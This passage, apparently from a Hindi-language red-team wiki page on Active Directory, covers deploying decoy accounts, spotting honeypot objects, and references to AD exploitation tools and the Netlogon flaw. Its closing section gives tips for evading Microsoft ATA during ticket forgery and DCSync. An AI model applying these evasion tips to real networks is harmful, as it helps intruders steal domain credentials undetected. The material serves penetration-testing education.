- Operator इन्हें आसानी से बदल सकते हैं; इन्हें यह समझाने के लिए इस्तेमाल करना बेहतर है कि cross-protocol cluster suspicious क्यों है
- **Operational notes**:
- कुछ signals के लिए decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, या service-side visibility चाहिए
- Alerts में promote करने से पहले Samba/Linux clients, appliances, और legacy software के against validate करें
- Confidence बढ़ाने के साथ detections को enrichment -> hunting -> alerting से आगे बढ़ाएं

### **Deception Techniques लागू करना**

- Deception लागू करने में traps बनाना शामिल है, जैसे decoy users या computers, जिनमें passwords का कभी expire न होना या Trusted for Delegation के रूप में marked होना जैसे features हों। एक विस्तृत approach में specific rights वाले users बनाना या उन्हें high privilege groups में जोड़ना शामिल है।
- एक practical example में tools जैसे उपयोग किए जा सकते हैं: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques deploy करने के बारे में अधिक जानकारी [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) पर मिल सकती है।

### **Deception की पहचान**

- **User Objects के लिए**: Suspicious indicators में atypical ObjectSID, infrequent logons, creation dates, और low bad password counts शामिल हैं।
- **General Indicators**: संभावित decoy objects के attributes की genuine objects से तुलना करने पर inconsistencies सामने आ सकती हैं। [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) जैसे tools इन deceptions की पहचान में मदद कर सकते हैं।

### **Detection Systems को Bypass करना**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection से बचने के लिए Domain Controllers पर session enumeration से बचें।
- **Ticket Impersonation**: Ticket creation के लिए **aes** keys का उपयोग detection से बचने में मदद करता है, क्योंकि इससे NTLM तक downgrade नहीं करना पड़ता।
- **DCSync Attacks**: ATA detection से बचने के लिए non-Domain Controller से execute करना सलाहनीय है, क्योंकि Domain Controller से direct execution alerts trigger करेगा।

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11ee)

{{#include ../../banners/hacktricks-training.md}}
